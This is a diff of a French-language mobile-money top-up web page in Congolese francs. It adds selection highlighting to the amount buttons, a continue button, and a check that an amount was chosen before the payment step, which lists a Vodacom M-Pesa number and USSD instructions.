@@ -13,6 +13,8 @@
         .container { max-width: 500px; margin: auto; }
         .amount-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
         .amount-btn { background: #1e293b; border: 1px solid #38bdf8; color: #fff; padding: 15px; border-radius: 8px; cursor: pointer; }
+        /* Style pour le montant sélectionné */
+        .amount-btn.selected { border: 2px solid #fff; background: #2563eb; }
         .channel-option { background: #1e293b; padding: 15px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #38bdf8; display: flex; align-items: center; gap: 10px; cursor: pointer; }
         .payment-box { background: #fff; color: #000; padding: 20px; border-radius: 15px; }
         .dial-btn { width: 100%; padding: 15px; background: #38bdf8; color: #fff; border: none; border-radius: 8px; font-weight: bold; margin: 15px 0; cursor: pointer; }
@@ -25,15 +27,15 @@
 <div class="container">
     <div id="page1">
         <h2>Recharger (CDF)</h2>
-        <div class="amount-grid">
-            <button class="amount-btn" onclick="showPayment('15 000')">15 000 CDF</button>
-            <button class="amount-btn" onclick="showPayment('30 000')">30 000 CDF</button>
-            <button class="amount-btn" onclick="showPayment('60 000')">60 000 CDF</button>
-            <button class="amount-btn" onclick="showPayment('120 000')">120 000 CDF</button>
-            <button class="amount-btn" onclick="showPayment('250 000')">250 000 CDF</button>
-            <button class="amount-btn" onclick="showPayment('450 000')">450 000 CDF</button>
-            <button class="amount-btn" onclick="showPayment('1 000 000')">1 000 000 CDF</button>
-            <button class="amount-btn" onclick="showPayment('2 000 000')">2 000 000 CDF</button>
+        <div class="amount-grid" id="amountGrid">
+            <button class="amount-btn" onclick="selectAmount('15 000', this)">15 000 CDF</button>
+            <button class="amount-btn" onclick="selectAmount('30 000', this)">30 000 CDF</button>
+            <button class="amount-btn" onclick="selectAmount('60 000', this)">60 000 CDF</button>
+            <button class="amount-btn" onclick="selectAmount('120 000', this)">120 000 CDF</button>
+            <button class="amount-btn" onclick="selectAmount('250 000', this)">250 000 CDF</button>
+            <button class="amount-btn" onclick="selectAmount('450 000', this)">450 000 CDF</button>
+            <button class="amount-btn" onclick="selectAmount('1 000 000', this)">1 000 000 CDF</button>
+            <button class="amount-btn" onclick="selectAmount('2 000 000', this)">2 000 000 CDF</button>
         </div>
         
         <label class="channel-option">
@@ -45,6 +47,8 @@
         <label class="channel-option">
             <input type="radio" name="c" value="Vodacom" data-num="0813944647" data-ussd="*1122# > Sélectionner Franc Congolais > Entrer le numéro"> Vodacom M-Pesa
         </label>
+
+        <button class="dial-btn" onclick="validateAndGo()">Continuer vers le paiement</button>
     </div>
 
     <div id="page2" class="hidden payment-box">
@@ -66,6 +70,19 @@
     const firebaseConfig = { databaseURL: "https://canal-e4274-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    
+    let selectedAmount = null;
+
+    function selectAmount(amt, btn) {
+        selectedAmount = amt;
+        document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
+        btn.classList.add('selected');
+    }
+
+    function validateAndGo() {
+        if (!selectedAmount) { alert("Veuillez sélectionner un montant."); return; }
+        showPayment(selectedAmount);
+    }
 
     function showPayment(amount) {
         const sel = document.querySelector('input[name="c"]:checked');
